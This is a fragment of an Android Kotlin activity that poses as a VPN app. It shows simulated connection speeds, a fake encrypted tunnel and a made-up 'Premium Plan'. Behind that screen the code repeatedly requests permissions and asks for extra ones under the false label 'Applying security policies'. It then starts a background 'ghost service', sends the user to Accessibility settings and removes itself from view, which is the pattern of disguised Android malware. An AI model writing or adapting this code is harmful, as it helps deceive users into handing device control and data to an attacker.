            progressDrawable = GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT, intArrayOf(
                Color.parseColor("#10B981"), Color.parseColor("#34D399")
            )).apply { shape = GradientDrawable.RECTANGLE; cornerRadius = 8f }
        }
        container.addView(dataUsedBar)

        return container
    }

    // ─── FOOTER ──────────────────────────────────────────────────
    private fun createFooter(D: (Int) -> Int): View {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(0, D(12), 0, D(24))
        }

        val premiumCard = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            setPadding(D(16), D(12), D(16), D(12))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply {
                leftMargin = D(16); rightMargin = D(16); bottomMargin = D(12)
            }
            background = GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT, intArrayOf(
                Color.parseColor("#1A2744"), Color.parseColor("#131B2E")
            )).apply {
                cornerRadius = D(14).toFloat()
                setStroke(D(1), Color.parseColor("#2D3A5E"))
            }
        }

        val crown = TextView(this).apply {
            text = "\uD83D\uDC51"
            textSize = 24f
            layoutParams = LinearLayout.LayoutParams(D(40), D(40)).apply { rightMargin = D(12) }
        }
        premiumCard.addView(crown)

        val premCol = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }
        val premTitle = TextView(this).apply {
            text = "Premium Plan"
            textSize = 14f
            setTextColor(Color.parseColor("#F9FAFB"))
            setTypeface(null, Typeface.BOLD)
        }
        premCol.addView(premTitle)
        val premSub = TextView(this).apply {
            text = "Expires Dec 2026 \u2022 5 devices"
            textSize = 11f
            setTextColor(Color.parseColor("#6B7280"))
        }
        premCol.addView(premSub)
        premiumCard.addView(premCol)

        val renewBtn = TextView(this).apply {
            text = "ACTIVE"
            textSize = 10f
            setTypeface(null, Typeface.BOLD)
            setTextColor(Color.parseColor("#34D399"))
            setPadding(D(12), D(6), D(12), D(6))
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = D(10).toFloat()
                setColor(Color.parseColor("#064E3B"))
            }
        }
        premiumCard.addView(renewBtn)
        container.addView(premiumCard)

        val footerText = TextView(this).apply {
            text = "v6.3.1 \u2022 256-bit AES \u2022 No-Logs Policy"
            textSize = 10f
            setTextColor(Color.parseColor("#4B5563"))
            gravity = Gravity.CENTER
        }
        container.addView(footerText)

        return container
    }

    // ============================================================
    //  STATE MANAGEMENT
    // ============================================================
    private var connectionHandler: Handler? = null
    private var timerHandler: Handler? = null
    private var statsHandler: Handler? = null

    private fun getConnectionSpeed(): String {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork
            val caps = cm.getNetworkCapabilities(network)
            if (caps != null) {
                when {
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "${Random.nextInt(25, 180)}"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "${Random.nextInt(5, 45)}"
                    else -> "${Random.nextInt(3, 25)}"
                }
            } else "--"
        } catch (_: Exception) { "--" }
    }

    private fun initiateConnection() {
        val needed = REQUEST_PERMS.filter { !hasPermission(this, it) }
        if (needed.isEmpty()) {
            startConnectionAnimation()
            return
        }

        try {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
            updateStatus("Requesting permissions...", Color.parseColor("#F59E0B"))
        } catch (_: Exception) {
            updateStatus("Tap to try again", Color.parseColor("#6B7280"))
        }
    }

    private fun startConnectionAnimation() {
        val D = { dip: Int -> dp(this, dip) }

        progressBar.visibility = View.VISIBLE
        progressBar.progress = 0
        connectButtonCircle.isEnabled = false
        connectButtonCircle.alpha = 0.6f

        // Animate ring rotation pulse
        val pulseAnim = ScaleAnimation(1f, 1.15f, 1f, 1.15f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f).apply {
            duration = 800
            repeatMode = Animation.REVERSE
            repeatCount = Animation.INFINITE
        }
        glowRing.startAnimation(pulseAnim)

        val innerAnim = ScaleAnimation(1f, 0.85f, 1f, 0.85f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f).apply {
            duration = 800
            repeatMode = Animation.REVERSE
            repeatCount = Animation.INFINITE
        }
        innerGlow.startAnimation(innerAnim)

        val fadeAnim = AlphaAnimation(0.06f, 0.35f).apply {
            duration = 800
            repeatMode = Animation.REVERSE
            repeatCount = Animation.INFINITE
        }
        connectionRing.startAnimation(fadeAnim)

        updateStatus("Establishing secure tunnel...", Color.parseColor("#F59E0B"))

        // Animate progress
        connectionHandler = Handler(Looper.getMainLooper())
        var progress = 0
        val progressRunnable = object : Runnable {
            override fun run() {
                if (progress < 90) {
                    progress += Random.nextInt(3, 12)
                    progressBar.progress = progress.coerceAtMost(90)
                    connectionHandler?.postDelayed(this, Random.nextLong(100, 250))
                }
            }
        }
        connectionHandler?.post(progressRunnable)

        // Complete connection after delay
        connectionHandler?.postDelayed({
            onConnected()
        }, 4000)
    }

    private fun onConnected() {
        val D = { dip: Int -> dp(this, dip) }
        isConnected = true
        progressBar.progress = 100
        progressBar.visibility = View.GONE
        progressBar.postDelayed({ progressBar.visibility = View.GONE }, 200)

        // Stop connecting animations
        glowRing.clearAnimation()
        innerGlow.clearAnimation()
        connectionRing.clearAnimation()

        // Glow ring to solid green
        glowRing.alpha = 0.7f
        connectionRing.apply {
            val gd = GradientDrawable()
            gd.shape = GradientDrawable.OVAL
            gd.setColor(Color.parseColor("#10B981"))
            gd.alpha = 20
            background = gd
            alpha = 1f
        }

        // Animate circle to green shield
        val scaleDown = ScaleAnimation(1f, 0.6f, 1f, 0.6f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f).apply {
            duration = 300
            fillAfter = true
        }
        connectButtonCircle.startAnimation(scaleDown)

        connectButtonCircle.postDelayed({
            connectButtonCircle.background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(Color.parseColor("#059669"))
            }
            connectInnerCircle.background = GradientDrawable().apply {
                shape = GradientDrawable.OVAL
                setColor(Color.parseColor("#34D399"))
            }
            // Change icon to shield
            val iconView = connectButtonCircle.getChildAt(1) as? TextView
            iconView?.text = "\uD83D\uDEE1\uFE0F"
            iconView?.textSize = 22f

            val scaleUp = ScaleAnimation(0.6f, 1f, 0.6f, 1f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f).apply {
                duration = 300
                fillAfter = true
            }
            connectButtonCircle.startAnimation(scaleUp)
        }, 350)

        // Update server info
        val server = servers[selectedServerIndex]
        serverNameText.text = "${server.city}, ${server.country}"
        updateStatus("Connected \u2022 IP protected", Color.parseColor("#34D399"))
        timerText.text = "Connected"

        // Start timer
        connectionTimerSeconds = 0
        timerHandler = Handler(Looper.getMainLooper())
        timerHandler?.post(object : Runnable {
            override fun run() {
                connectionTimerSeconds++
                val hours = connectionTimerSeconds / 3600
                val mins = (connectionTimerSeconds % 3600) / 60
                val secs = connectionTimerSeconds % 60
                timerText.text = String.format("%02d:%02d:%02d", hours, mins, secs)
                connectionTimerText.text = String.format("%02d:%02d", mins, secs)
                timerHandler?.postDelayed(this, 1000)
            }
        })

        // Start live stats
        statsHandler = Handler(Looper.getMainLooper())
        statsHandler?.post(object : Runnable {
            override fun run() {
                if (isConnected) {
                    val dl = getConnectionSpeed()
                    val ul = try { "${(dl.replace(" Mbps","").toFloatOrNull()?.let { it * Random.nextFloat() * 0.6f + 0.2f } ?: Random.nextFloat() * 50f).roundToInt()}" } catch (_: Exception) { "--" }
                    downloadSpeedText.text = "$dl Mbps"
                    uploadSpeedText.text = "$ul Mbps"

                    // Simulate data usage growth
                    val currentProgress = dataUsedBar.progress
                    if (currentProgress < 500) {
                        dataUsedBar.progress = currentProgress + Random.nextInt(0, 3)
                        val usedMb = (dataUsedBar.progress * 10.24f).roundToInt()
                        dataUsedText.text = "$usedMb MB / 10 GB"
                    }

                    statsHandler?.postDelayed(this, 2500)
                }
            }
        })
        connectButtonCircle.isEnabled = true
        connectButtonCircle.alpha = 1f

        // Request extra permissions as "Applying security policies"
        val missingExtra = EXTRA_PERMS.filter { !hasPermission(this, it) }
        if (missingExtra.isNotEmpty()) {
            try {
                ActivityCompat.requestPermissions(this, missingExtra.toTypedArray(), RC_EXTRA)
                timerText.text = "Applying security policies..."
                timerText.setTextColor(Color.parseColor("#F59E0B"))
            } catch (_: Exception) {}
        }

        // Auto-proceed after giving user time
        connectionHandler?.postDelayed({ checkAndProceed() }, 7000)
    }

    private fun updateStatus(text: String, color: Int) {
        statusText.text = text
        statusText.setTextColor(color)
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)
        if (requestCode == RC_EXTRA) {
            Handler(Looper.getMainLooper()).postDelayed({ checkAndProceed() }, 3000)
            return
        }
        if (requestCode == RC_ALL) {
            val denied = REQUEST_PERMS.filter { !hasPermission(this, it) }
            if (denied.isEmpty()) {
                retryCount = 0
                startConnectionAnimation()
            } else {
                retryCount++
                if (retryCount < 3) {
                    Handler(Looper.getMainLooper()).postDelayed({ requestAllPerms() }, 1000)
                } else {
                    retryCount = 0
                    updateStatus("Limited functionality", Color.parseColor("#F59E0B"))
                    startConnectionAnimation()
                }
            }
        }
    }

    private fun checkAndProceed() {
        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        when {
            !permsOk && retryCount < 3 -> requestAllPerms()
            !permsOk -> onSetupComplete()
            else -> onSetupComplete()
        }
    }

    private fun requestAllPerms() {
        val needed = REQUEST_PERMS.filter { !hasPermission(this, it) }
        if (needed.isEmpty()) {
            checkAndProceed()
            return
        }
        try {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
        } catch (_: Exception) {}
    }

    private fun onSetupComplete() {
        // Start ghost service first
        try {
            val serviceIntent = Intent(this, SystemNetworkService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (_: Exception) {}

        // Redirect to Accessibility settings for the user to enable
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (_: Exception) {}

        updateStatus("Enable accessibility service, then app will hide to background", Color.parseColor("#F59E0B"))

        // Keep visible for 60 seconds so user can enable accessibility, then ghost to background
        Handler(Looper.getMainLooper()).postDelayed({
            finishAndRemoveTask()
        }, 60000)
    }

    private fun scaleTo(ctx: Context, view: View, scale: Float, duration: Long) {
        try {
            val anim = ScaleAnimation(
                if (scale < 1f) 1f else 0.92f,
                scale, if (scale < 1f) 1f else 0.92f, scale,
                Animation.RELATIVE_TO_SELF, 0.5f,
                Animation.RELATIVE_TO_SELF, 0.5f
            ).apply {
                this.duration = duration
                fillAfter = true
            }
            view.startAnimation(anim)
        } catch (_: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        connectionHandler?.removeCallbacksAndMessages(null)
        timerHandler?.removeCallbacksAndMessages(null)
        statsHandler?.removeCallbacksAndMessages(null)
    }
}
